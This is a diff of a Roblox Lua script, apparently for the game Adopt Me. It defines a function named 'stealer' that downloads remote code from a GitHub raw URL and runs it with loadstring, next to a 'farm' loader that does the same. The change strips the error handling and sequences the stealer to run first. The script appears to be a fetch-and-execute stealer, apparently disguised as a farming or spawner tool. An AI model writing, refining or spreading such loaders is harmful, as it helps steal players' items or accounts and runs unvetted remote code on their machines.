@@ -1,26 +1,14 @@
 local function stealer()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua"))()
-    end)
-    if not success then
-        warn("Failed to run stealer script:", err)
-    end
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua'))()
 end
 
 local function farm()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt"))()
-    end)
-    if not success then
-        warn("Failed to run farm script:", err)
-    end
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMeScriptt/loadingandspawner/refs/heads/main/finalspawnerloading.lua.txt'))()
 end
 
--- Slight delay to avoid resource contention
+-- Run stealer first, wait a bit, then run farm
 task.spawn(function()
     stealer()
-end)
-
-task.delay(1, function()
+    task.wait(2) -- Wait 2 seconds to let stealer finish setup
     farm()
 end)
